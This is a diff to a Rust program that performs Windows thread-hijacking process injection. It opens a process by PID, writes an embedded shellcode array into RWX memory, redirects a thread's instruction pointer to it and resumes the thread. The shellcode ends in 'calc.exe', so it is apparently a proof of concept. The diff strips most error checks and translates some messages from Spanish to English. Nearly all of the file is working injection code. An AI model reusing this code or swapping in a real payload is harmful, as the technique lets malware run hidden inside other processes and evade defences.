@@ -38,82 +38,46 @@ fn main() {
             0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
             0x2e,0x65,0x78,0x65,0x00];
 
-        let target_pid = 25692; // <--- CHANGE THIS
+        let target_pid = 7516; // <--- CHANGE THIS
         let mut thread_hijacked = 0;
 
         let mut context: CONTEXT = zeroed();
         let mut thread_entry: THREADENTRY32 = zeroed();
-
         context.ContextFlags = CONTEXT_FULL_AMD64;
         thread_entry.dwSize = size_of::<THREADENTRY32>() as u32;
 
         let target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
-        if target_process_handle == 0 {
-            panic!("[!] NO SE PUDO OBTENER UN MANEJADOR.");
-        } else {
-            println!("[+] MANEJADOR OBTENIDO CON ÉXITO.");
-        }
 
         let remote_buffer = VirtualAllocEx(target_process_handle, null(), shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        if remote_buffer.is_null() {
-            panic!("[!] LA MEMORIA NO PUDO SER ASIGNADA.");
-        } else {
-            println!("[+] MEMORIA ASIGNADA CON ÉXITO.");
-        }
 
-        if WriteProcessMemory(target_process_handle, remote_buffer, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == 0 {
-            panic!("[!] NO SE PUDO ESCRIBIR EL PAYLOAD EN LA MEMORIA.");
-        } else {
-            println!("[+] PAYLOAD ESCRITO CON ÉXITO EN LA MEMORIA.");
-        }
+        WriteProcessMemory(target_process_handle, remote_buffer, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut());
 
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if snapshot == 0 {
-            panic!("[!] NO SE PUDO TOMAR EL SNAPSHOT.");
-        } else {
-            println!("[+] SNAPSHOT TOMADO CON ÉXITO.");
-        }
 
         if Thread32First(snapshot, &mut thread_entry) != 0 {
             while Thread32Next(snapshot, &mut thread_entry) != 0 {
                 if  thread_entry.th32OwnerProcessID == target_pid {
                     thread_hijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
                     if thread_hijacked == 0 {
-                        panic!("[!] NO SE PUDO SECUESTRAR NINGÚN HILO.");
+                        panic!("[!] FAILED TO HIJACK THREAD.");
                     } else {
-                        println!("[+] HILO SECUESTRADO CON ÉXITO.");
                         break
                     }
                 }
             }
         };
 
-        if SuspendThread(thread_hijacked) == 0 {
-            println!("[+] HILO SUPENDIDO CON ÉXITO.");
-        } else {
-            panic!("[!] NO SE PUDO SUSPENDER EL HILO.");
-        }
+        SuspendThread(thread_hijacked);
 
         if GetThreadContext(thread_hijacked, &mut context) == 0 {
             let error_code = windows_sys::Win32::Foundation::GetLastError();
-            panic!("[!] NO SE PUDO OBTENER INFORMACIÓN DEL HILO. {}", error_code);
+            panic!("[!] COULD NOT OBTAIN THE THREAD. {}", error_code);
         } else {
-            println!("[+] INFORMACIÓN DEL HILO OBTENIDA CON ÉXITO.");
             context.Rip = remote_buffer as u64;
         }
 
-        if SetThreadContext(thread_hijacked, &mut context) == 0 {
-            panic!("[!] NO SE PUDO ACTUALIZAR EL HILO.");
-        } else {
-            println!("[+] HILO ACTUALIZADO CON ÉXITO.");
-        }
+        SetThreadContext(thread_hijacked, &mut context);
 
-        if ResumeThread(thread_hijacked) == 0 {
-            panic!("[!] NO SE PUDO REANUDAR EL HILO.");
-        } else {
-            println!("[+] HILO REANUDADO CON ÉXITO");
-        }
-
-        println!("¡FIN DEL PROGRAMA!");
+        ResumeThread(thread_hijacked);
     }
 }
